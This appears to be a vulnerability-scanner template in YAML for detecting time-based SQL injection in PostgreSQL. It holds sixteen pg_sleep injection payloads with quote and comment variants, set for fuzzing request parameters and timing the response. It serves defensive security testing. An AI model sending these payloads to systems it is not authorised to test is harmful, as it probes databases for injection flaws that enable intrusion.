id: postgres-sqli-time-based

info:
  name: PostgreSQL Time based SQL Injection
  author: pdteam
  severity: critical
  reference:
    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionPostgreScanRule.java


http:
  - payloads:
      injections:
        low:
          - "case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end"
          - "case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end --"
          - "' case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end --"
          - "\" case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end --"
        medium:
          - " / case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end "
          - "' / case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end / '"
          - "\" / case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end / \""
          - " where 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - "' where 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - "\" where 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
        high:
          - " and 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - "' and 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - "\" and 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - " or 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - "' or 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          - "\" or 0 in (select case when cast(pg_sleep([SLEEPTIME]) as varchar) > '' then 0 else 1 end ) --"
          
    attack: pitchfork

    analyzer:
      name: time_delay
        
    fuzzing:
      - part: request
        type: postfix
        mode: single
        fuzz:
          - "{{injections}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: analyzer
        words:
          - "true"
